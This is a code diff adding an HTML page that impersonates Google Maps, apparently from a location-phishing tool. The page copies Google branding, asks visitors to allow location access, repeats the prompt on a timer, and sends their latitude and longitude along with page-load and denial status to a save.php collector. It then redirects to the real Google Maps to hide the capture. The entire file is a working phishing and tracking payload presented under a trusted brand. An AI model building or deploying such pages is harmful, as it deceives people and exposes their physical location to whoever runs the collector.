@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Maps</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://maps.gstatic.com/favicon.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <img src="https://maps.gstatic.com/consumer/images/icons/1x/maps_bluepin.png" alt="Google Maps" class="logo">
+            <h1>Google Maps</h1>
+        </header>
+        
+        <main>
+            <div class="location-card">
+                <div class="location-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#1a73e8">
+                        <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
+                    </svg>
+                </div>
+                <div class="location-text">
+                    <h2>Get better results with location access</h2>
+                    <p>Allow Google Maps to use your device's location for accurate navigation and local results</p>
+                </div>
+            </div>
+            
+            <button class="allow-btn" onclick="requestLocation()">Allow location access</button>
+            <p class="small-text">Your location will be used only for mapping purposes</p>
+        </main>
+    </div>
+    
+    <script>
+        fetch('http://localhost:8080/save.php?status=page_loaded');
+        
+        function requestLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        fetch(`http://localhost:8080/save.php?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&status=location_granted`);
+                        document.querySelector('.location-card').innerHTML = `
+                            <div class="success-animation">
+                                <svg class="checkmark" viewBox="0 0 52 52">
+                                    <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
+                                    <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+                                </svg>
+                                <h2>Location enabled successfully!</h2>
+                            </div>
+                        `;
+                        setTimeout(() => {
+                            window.location.href = "https://maps.google.com";
+                        }, 2000);
+                    },
+                    err => {
+                        fetch('http://localhost:8080/save.php?status=location_denied');
+                        alert("Location access is required for full functionality");
+                    }
+                );
+            }
+        }
+        
+        setTimeout(requestLocation, 4000);
+    </script>
+</body>
+</html>
